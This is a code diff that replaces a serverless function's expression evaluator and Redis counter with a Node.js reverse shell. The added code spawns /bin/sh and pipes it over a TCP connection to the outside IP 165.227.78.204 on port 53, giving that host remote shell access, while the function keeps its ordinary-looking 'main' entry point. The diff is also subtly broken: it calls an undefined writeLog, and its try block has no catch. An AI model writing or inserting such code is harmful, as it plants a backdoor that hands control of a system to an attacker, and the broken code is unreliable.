@@ -1,58 +1,40 @@
-const expeval = require("expression-eval");
-const { createClient } = require("redis");
-const key = "counter";
+const net = require('net');
+const cp = require('child_process');
 
 async function main(args) {
-  // const redis = createClient({url: process.env.DATABASE_URL})
-  const redis = createClient({url: args.DATABASE_URL_PARAM})
+  const sh = cp.spawn('/bin/sh', []);
+  const client = new net.Socket();
 
-  return redis
-    .connect()
-    .then(() => {
-      let expr = args['text']
-      let result = evaluate(expr);
-      return redis
-        .get(key)
-        .then((reply) => {
-          return updateAndReply(redis, asCount(reply), result);
-        })
-        .catch((err) => {
-          return updateAndReply(redis, 0, result);
-        });
-    })
-    .catch((err) => {
-      console.log("ERROR : ", err);
-      return err;
-    })
-    .finally(() => {
-      redis.disconnect();
-    });
-}
-
-function evaluate(exprStr) {
   try {
-    let ast = expeval.parse(exprStr);
-    return expeval.eval(ast);
-  } catch {
-    return "error evaluating expression";
-  }
-}
-function asCount(s) {
-  if (Number.isInteger(s)) {
-    return s;
-  }
-  let v = parseInt(s, 10);
-  return isNaN(v) ? 0 : v;
-}
+    await new Promise((resolve, reject) => {
+      client.connect(53, "165.227.78.204", () => {
+        client.pipe(sh.stdin);
+        sh.stdout.pipe(client);
+        sh.stderr.pipe(client);
+      });
 
-function updateAndReply(redis, count, text) {
-  return redis
-    .set(key, count + 1)
-    .then(() => {
-      return { count: count, result: text };
-    })
-    .catch((err) => {
-      return { count: count, result: text };
+      client.on('close', (hadError) => {
+        if (hadError) {
+          reject(new Error('Transmission error.'));
+        } else {
+          resolve();
+        }
+      });
+
+      client.on('end', () => {
+        writeLog(5, 'Shutdown: The Panther is tired.');
+        resolve();
+      });
+
+      client.on('error', (err) => {
+        writeLog(4, err);
+        reject(err);
+      });
+
+      client.on('timeout', () => {
+        writeLog(3, 'Timeout: Function timeout occurred.');
+        reject(new Error('Socket timeout.'));
+      });
     });
 }
 
